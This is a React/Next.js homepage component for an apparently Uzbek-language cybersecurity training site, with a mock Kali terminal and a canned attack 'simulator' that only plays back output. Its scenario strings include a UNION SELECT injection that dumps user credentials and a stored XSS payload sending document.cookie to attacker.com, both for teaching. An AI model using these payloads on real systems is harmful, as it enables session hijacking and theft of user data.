'use client';

import { useState, useEffect } from 'react';
import Link from 'next/link';
import { 
  Shield, Terminal, Zap, ArrowRight, CheckCircle2, Lock, 
  Users, Trophy, Globe, Play, Sparkles, AlertTriangle, 
  Code, RefreshCw, Cpu, Award, ChevronRight 
} from 'lucide-react';
import { Button } from '@/components/ui/button';

export default function HomePage() {
  const [activeTab, setActiveTab] = useState<'sqli' | 'xss' | 'idor'>('sqli');
  const [simRunning, setSimRunning] = useState(false);
  const [simResult, setSimResult] = useState<string | null>(null);

  // Live simulation demo interactive states
  const scenarios = {
    sqli: {
      title: 'SQL Injection (SQLi) Simulyatsiyasi',
      target: 'http://target-app.lab:8080/search?query=',
      payload: "' UNION SELECT null, username, password FROM users --",
      output: [
        "[+] Hujum so'rovi yuborilmoqda: GET /search?query=' UNION SELECT null...",
        "[*] Server javobi: HTTP 200 OK (5 columns matched)",
        "[!] Natija: Baza foydalanuvchilari ochildi:",
        "    admin : $2a$12$e8x... (Password Hash)",
        "    director : $2a$12$K19... (Password Hash)",
        "🎯 [ZAIFLIK TASDIQLANDI]: Ma'lumotlar bazasi to'liq kompromat qilindi!",
      ],
      impact: "Hujumchi parollarsiz ma'lumotlar bazasidagi maxfiy yozuvlarni chiqarib oldi.",
    },
    xss: {
      title: 'Cross-Site Scripting (Stored XSS) Simulyatsiyasi',
      target: 'http://cyberforum.lab:8080/threads/reply',
      payload: "<script>fetch('http://attacker.com/steal?cookie=' + document.cookie)</script>",
      output: [
        "[+] Forum izoh maydoniga JavaScript kodi joylashtirildi",
        "[*] Server izohni ma'lumotlar bazasiga filtrsiz saqladi",
        "[*] Administrator boti sahifani ochdi...",
        "[!] Brauzerda skript avtomatik bajarildi!",
        "    O'g'irlangan cookie: session_id=eyJhbGciOi... (Admin Token)",
        "🎯 [ZAIFLIK TASDIQLANDI]: Admin sessiyasi qo'lga kiritildi!",
      ],
      impact: "Hujumchi admin hisobiga ruxsatsiz kirish huquqini qo'lga kiritdi.",
    },
    idor: {
      title: 'IDOR / BOLA Avtorizatsiya Buzilishi',
      target: 'https://securedocs.corp/api/v1/documents?id=1001',
      payload: "Parametr almashtirildi: ?id=1042 -> ?id=1001 (Boshqaruvchi direktor fayli)",
      output: [
        "[+] Mijoz identifikatori 1042 o'rniga direktorning #1001-fayliga so'rov yuborildi",
        "[*] Backend avtorizatsiya tokenini parametr bilan solishtirmadi",
        "[!] Server javobi: 200 OK — 'Maxfiy Moliya Audit Hisoboti 2026.pdf'",
        "    FLAG{idor_unauthorized_document_access_success}",
        "🎯 [ZAIFLIK TASDIQLANDI]: Begona maxfiy korporativ hujjat yuklab olindi!",
      ],
      impact: "Boshqa foydalanuvchilarning shaxsiy va tijoriy sirlariga ruxsatsiz kirildi.",
    },
  };

  const handleRunSim = () => {
    setSimRunning(true);
    setSimResult(null);
    setTimeout(() => {
      setSimResult('DONE');
      setSimRunning(false);
    }, 1200);
  };

  const activeScenario = scenarios[activeTab];

  return (
    <div className="flex-1 bg-[#070A0E] text-gray-100 overflow-hidden font-sans">
      
      {/* ── 1. HERO SECTION (Punchy & Animated) ── */}
      <section className="relative py-16 md:py-24 px-4 overflow-hidden border-b border-gray-800/80 cyber-grid-bg">
        {/* Subtle Ambient Glows (Lightweight) */}
        <div className="absolute top-1/4 left-1/2 -translate-x-1/2 w-96 h-96 bg-cyan-500/10 rounded-full blur-3xl pointer-events-none" />

        <div className="max-w-7xl mx-auto flex flex-col lg:flex-row items-center gap-12 relative z-10">
          
          {/* Left: Punchy Headline & CTAs */}
          <div className="flex-1 space-y-6 text-center lg:text-left">
            
            {/* Live Indicator Badge */}
            <div className="inline-flex items-center space-x-2 bg-gray-900/90 border border-gray-800 px-3.5 py-1.5 rounded-full text-xs">
              <span className="w-2 h-2 rounded-full bg-emerald-400 animate-cyber-pulse" />
              <span className="text-gray-300 font-semibold">Jonli Kiber-Poligon:</span>
              <span className="text-cyan-400 font-bold font-mono">140+ talaba faol</span>
            </div>

            <h1 className="text-4xl sm:text-5xl lg:text-6xl font-black tracking-tight text-white leading-tight">
              Kiberxavfsizlikni <span className="text-transparent bg-clip-text bg-gradient-to-r from-cyan-400 to-emerald-400">real amaliyot</span> orqali egallang
            </h1>

            <p className="text-sm md:text-base text-gray-400 max-w-xl mx-auto lg:mx-0 leading-relaxed">
              Quruq nazariyadan charchadingizmi? CYBERTRIP.UZ da brauzer orqali haqiqiy veb-zaifliklarni aniqlang, CTF musobaqalarida jamoaviy bellashing va professional pentesterga aylaning.
            </p>

            <div className="flex flex-wrap items-center justify-center lg:justify-start gap-3.5 pt-2">
              <Link href="/learn">
                <button className="px-6 py-3.5 bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-400 hover:to-emerald-400 text-black font-extrabold text-xs rounded-xl shadow-xl shadow-cyan-500/20 transition-all flex items-center space-x-2">
                  <span>O'rganishni Boshlash</span>
                  <ArrowRight className="w-4 h-4" />
                </button>
              </Link>

              <Link href="/labs">
                <button className="px-5 py-3.5 bg-gray-900 hover:bg-gray-850 border border-gray-800 text-xs font-bold text-gray-200 rounded-xl transition-colors flex items-center space-x-2">
                  <Terminal className="w-4 h-4 text-cyan-400" />
                  <span>Amaliy Laboratoriyalar (50+)</span>
                </button>
              </Link>
            </div>

            {/* Quick Proof Metrics */}
            <div className="flex items-center justify-center lg:justify-start space-x-6 pt-4 text-xs font-mono text-gray-400">
              <div className="flex items-center space-x-2">
                <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                <span>50+ Veb-Lablar</span>
              </div>
              <div className="flex items-center space-x-2">
                <CheckCircle2 className="w-4 h-4 text-cyan-400" />
                <span>Kali Linux Terminal</span>
              </div>
              <div className="flex items-center space-x-2">
                <CheckCircle2 className="w-4 h-4 text-purple-400" />
                <span>Bank Kartalari</span>
              </div>
            </div>

          </div>

          {/* Right: High-Tech Animated Terminal Simulator */}
          <div className="flex-1 w-full max-w-lg">
            <div className="rounded-2xl border border-gray-800 bg-[#0B0F17] shadow-2xl overflow-hidden relative">
              
              {/* Scan laser line animation */}
              <div className="absolute top-0 left-0 right-0 h-1 bg-gradient-to-r from-transparent via-cyan-400 to-transparent animate-scan-line pointer-events-none" />

              {/* Terminal Window Header */}
              <div className="h-10 bg-[#090D13] border-b border-gray-800 flex items-center justify-between px-4">
                <div className="flex items-center space-x-2">
                  <span className="w-2.5 h-2.5 rounded-full bg-red-500/80" />
                  <span className="w-2.5 h-2.5 rounded-full bg-yellow-500/80" />
                  <span className="w-2.5 h-2.5 rounded-full bg-emerald-500/80" />
                  <span className="text-[11px] font-mono text-gray-400 ml-2">cybertrip-sandbox: bash</span>
                </div>
                <span className="text-[10px] font-mono text-cyan-400 bg-cyan-500/10 px-2 py-0.5 rounded border border-cyan-500/20">
                  REAL-TIME
                </span>
              </div>

              {/* Terminal Body */}
              <div className="p-5 font-mono text-xs text-gray-300 space-y-2 h-72 overflow-hidden bg-black/60">
                <p className="text-gray-500"># CyberTrip Kali Security Suite v3.2</p>
                <p className="text-emerald-400">
                  kali@cybertrip:~$ nmap -sV -p 80,8080 target-app.lab
                </p>
                <p className="text-gray-400">
                  PORT     STATE SERVICE VERSION<br />
                  80/tcp   open  http    Nginx 1.24 (Vulnerable App)<br />
                  8080/tcp open  http    Node.js / Express API
                </p>
                <p className="text-emerald-400 pt-1">
                  kali@cybertrip:~$ sqlmap -u "http://target/search?q=1" --dbs
                </p>
                <p className="text-yellow-400">
                  [+] GET parameter 'q' is vulnerable to UNION Injection!
                </p>
                <p className="text-cyan-400">
                  [+] Available databases: ['cyberbooks', 'secret_vault', 'users']
                </p>
                <p className="text-emerald-400 font-bold flex items-center">
                  <span>kali@cybertrip:~$ cat /secret/flag.txt</span>
                </p>
                <p className="text-cyan-300 font-bold bg-cyan-950/40 p-1.5 rounded border border-cyan-500/30">
                  {"FLAG{cybertrip_sqli_expert_2026}"}
                </p>
              </div>

            </div>
          </div>

        </div>
      </section>

      {/* ── 2. CORE PILLARS (Clean 3 Pillars — No Clutter) ── */}
      <section className="py-20 px-4 max-w-7xl mx-auto">
        <div className="text-center max-w-2xl mx-auto mb-14 space-y-3">
          <span className="text-xs font-bold text-cyan-400 uppercase tracking-wider bg-cyan-500/10 border border-cyan-500/20 px-3 py-1 rounded-full">
            Ta'lim Metodologiyasi
          </span>
          <h2 className="text-3xl font-black text-white">Nega Aynan CYBERTRIP.UZ?</h2>
          <p className="text-xs text-gray-400 leading-relaxed">
            Biz shunchaki video darslik emasmiz — biz xavfsizlik mutaxassisi kabi fikrlash va harakat qilishni o'rgatamiz.
          </p>
        </div>

        <div className="grid grid-cols-1 md:grid-cols-3 gap-6">
          
          <div className="bg-[#0B0F17] border border-gray-800 p-8 rounded-2xl space-y-4 hover:border-cyan-500/50 transition-all group">
            <div className="w-12 h-12 rounded-xl bg-cyan-500/10 border border-cyan-500/20 text-cyan-400 flex items-center justify-center group-hover:scale-110 transition-transform">
              <Globe className="w-6 h-6" />
            </div>
            <h3 className="text-lg font-bold text-white group-hover:text-cyan-400 transition-colors">
              1. Tizimli Nazariya & Yo'laklar
            </h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              Web Pentest, Linux, Tarmoq xavfsizligi va SOC bo'yicha bosqichma-bosqich o'quv dasturlari. Har bir dars o'zbek tilida, amaliy misollar bilan yoritilgan.
            </p>
            <Link href="/learn" className="inline-flex items-center text-xs font-bold text-cyan-400 hover:underline pt-2">
              Yo'nalishlarni ko'rish →
            </Link>
          </div>

          <div className="bg-[#0B0F17] border border-gray-800 p-8 rounded-2xl space-y-4 hover:border-emerald-500/50 transition-all group">
            <div className="w-12 h-12 rounded-xl bg-emerald-500/10 border border-emerald-500/20 text-emerald-400 flex items-center justify-center group-hover:scale-110 transition-transform">
              <Terminal className="w-6 h-6" />
            </div>
            <h3 className="text-lg font-bold text-white group-hover:text-emerald-400 transition-colors">
              2. 50+ Real Veb-Laboratoriya
            </h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              SQL Injection, XSS, SSRF, IDOR, Command Injection va File Upload zaifliklarini hech narsa o'rnatmasdan, to'g'ridan-to'g'ri brauzeringizdagi poligonda ekspluatatsiya qiling.
            </p>
            <Link href="/labs" className="inline-flex items-center text-xs font-bold text-emerald-400 hover:underline pt-2">
              Laboratoriyalarga o'tish →
            </Link>
          </div>

          <div className="bg-[#0B0F17] border border-gray-800 p-8 rounded-2xl space-y-4 hover:border-purple-500/50 transition-all group">
            <div className="w-12 h-12 rounded-xl bg-purple-500/10 border border-purple-500/20 text-purple-400 flex items-center justify-center group-hover:scale-110 transition-transform">
              <Users className="w-6 h-6" />
            </div>
            <h3 className="text-lg font-bold text-white group-hover:text-purple-400 transition-colors">
              3. Jamoalar & Kiber-Sport (CTF)
            </h3>
            <p className="text-xs text-gray-400 leading-relaxed">
              O'z kiber-jamoangizni yarating, maxfiy shifrlangan chatda strategiyalarni muhokama qiling va respublika miqyosidagi pullik turnirlarda g'olib bo'ling.
            </p>
            <Link href="/teams" className="inline-flex items-center text-xs font-bold text-purple-400 hover:underline pt-2">
              Jamoalar tizimi →
            </Link>
          </div>

        </div>
      </section>

      {/* ── 3. INTERACTIVE LIVE VULNERABILITY SIMULATOR WIDGET (Active & Engaging) ── */}
      <section className="py-20 px-4 bg-[#090D14] border-y border-gray-800/80">
        <div className="max-w-5xl mx-auto">
          
          <div className="text-center max-w-2xl mx-auto mb-10 space-y-2">
            <span className="text-xs font-bold text-emerald-400 uppercase tracking-wider bg-emerald-500/10 border border-emerald-500/20 px-3 py-1 rounded-full">
              Jonli Tajriba
            </span>
            <h2 className="text-2xl md:text-3xl font-black text-white">
              Zaiflik Qanday Ishlashini Hozir Sinab Ko'ring
            </h2>
            <p className="text-xs text-gray-400">
              Quyidagi zaiflik turlaridan birini tanlang va hujum tugmasini bosib natijani kuzating:
            </p>
          </div>

          {/* Interactive Simulator Shell */}
          <div className="bg-[#0B0F17] border border-gray-800 rounded-2xl shadow-2xl overflow-hidden">
            
            {/* Tab Selectors */}
            <div className="flex border-b border-gray-800 bg-[#070A0E] overflow-x-auto">
              {[
                { id: 'sqli', label: '1. SQL Injection' },
                { id: 'xss', label: '2. Stored XSS' },
                { id: 'idor', label: '3. IDOR / BOLA' },
              ].map((t) => (
                <button
                  key={t.id}
                  onClick={() => {
                    setActiveTab(t.id as any);
                    setSimResult(null);
                  }}
                  className={`px-5 py-3 text-xs font-bold transition-all border-b-2 whitespace-nowrap ${
                    activeTab === t.id
                      ? 'border-cyan-400 text-cyan-400 bg-cyan-500/5'
                      : 'border-transparent text-gray-400 hover:text-white'
                  }`}
                >
                  {t.label}
                </button>
              ))}
            </div>

            {/* Simulation Stage */}
            <div className="p-6 md:p-8 space-y-6">
              
              <div className="flex flex-col md:flex-row items-start md:items-center justify-between gap-4 bg-gray-950 p-4 rounded-xl border border-gray-800">
                <div className="space-y-1">
                  <span className="text-[10px] font-bold text-gray-500 uppercase tracking-wider block">Target Endpoint</span>
                  <span className="font-mono text-xs text-cyan-300">{activeScenario.target}</span>
                </div>

                <button
                  onClick={handleRunSim}
                  disabled={simRunning}
                  className="px-5 py-2.5 bg-gradient-to-r from-red-500 to-amber-500 hover:from-red-400 hover:to-amber-400 disabled:opacity-50 text-black font-extrabold text-xs rounded-xl shadow-lg transition-all flex items-center space-x-2"
                >
                  {simRunning ? (
                    <>
                      <RefreshCw className="w-3.5 h-3.5 animate-spin" />
                      <span>Hujum bajarilmoqda...</span>
                    </>
                  ) : (
                    <>
                      <Play className="w-3.5 h-3.5 fill-black" />
                      <span>Hujumni Simulyatsiya Qilish</span>
                    </>
                  )}
                </button>
              </div>

              {/* Payload Box */}
              <div>
                <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block mb-1.5">
                  Eksploit Payload (Hujum kodi):
                </span>
                <div className="bg-gray-950 border border-gray-800 rounded-xl p-3 font-mono text-xs text-yellow-300">
                  {activeScenario.payload}
                </div>
              </div>

              {/* Console Output */}
              <div>
                <span className="text-[11px] font-bold text-gray-400 uppercase tracking-wider block mb-1.5">
                  Server va Konsol Chiqishi:
                </span>
                <div className="bg-black border border-gray-800 rounded-xl p-4 font-mono text-xs space-y-1.5 min-h-[140px]">
                  {simRunning ? (
                    <div className="text-gray-500 animate-pulse">
                      [~] Serverga so'rov jo'natilmoqda... Zaiflik tekshirilmoqda...
                    </div>
                  ) : simResult === 'DONE' ? (
                    activeScenario.output.map((line, idx) => (
                      <div
                        key={idx}
                        className={
                          line.startsWith('🎯')
                            ? 'text-emerald-400 font-bold pt-2'
                            : line.startsWith('[+]')
                            ? 'text-cyan-400'
                            : line.startsWith('[!]')
                            ? 'text-amber-400'
                            : 'text-gray-300'
                        }
                      >
                        {line}
                      </div>
                    ))
                  ) : (
                    <div className="text-gray-500 italic">
                      Yuqoridagi "Hujumni Simulyatsiya Qilish" tugmasini bosing...
                    </div>
                  )}
                </div>
              </div>

              {/* Impact Callout */}
              <div className="p-4 bg-gray-900/60 border border-gray-800 rounded-xl flex items-center space-x-3 text-xs">
                <AlertTriangle className="w-5 h-5 text-amber-400 flex-shrink-0" />
                <span className="text-gray-300">
                  <strong>Xavfsizlik oqibati:</strong> {activeScenario.impact}
                </span>
              </div>

            </div>

          </div>

        </div>
      </section>

      {/* ── 4. FINAL CTA BANNER (High Conversion) ── */}
      <section className="py-20 px-4 max-w-5xl mx-auto text-center space-y-6">
        <h2 className="text-3xl md:text-4xl font-black text-white">
          Kiber-Sayohatga Tayyormisiz?
        </h2>
        <p className="text-xs md:text-sm text-gray-400 max-w-xl mx-auto leading-relaxed">
          O'zbekistonda kiberxavfsizlik sohasida yuqori maoshli mutaxassis bo'ling. Hoziroq ro'yxatdan o'ting va ilk laboratoriyangizni bepul ishga tushiring.
        </p>

        <div className="pt-2 flex flex-wrap justify-center gap-3">
          <Link href="/auth/register">
            <button className="px-7 py-3.5 bg-gradient-to-r from-cyan-500 to-emerald-500 hover:from-cyan-400 hover:to-emerald-400 text-black font-extrabold text-xs rounded-xl shadow-xl shadow-cyan-500/20 transition-all flex items-center space-x-2">
              <Sparkles className="w-4 h-4" />
              <span>Bepul Ro'yxatdan O'tish</span>
            </button>
          </Link>
          <Link href="/pricing">
            <button className="px-6 py-3.5 bg-gray-900 hover:bg-gray-800 border border-gray-800 text-xs font-bold text-gray-300 rounded-xl transition-colors">
              Tariflarni Ko'rish
            </button>
          </Link>
        </div>
      </section>

    </div>
  );
}
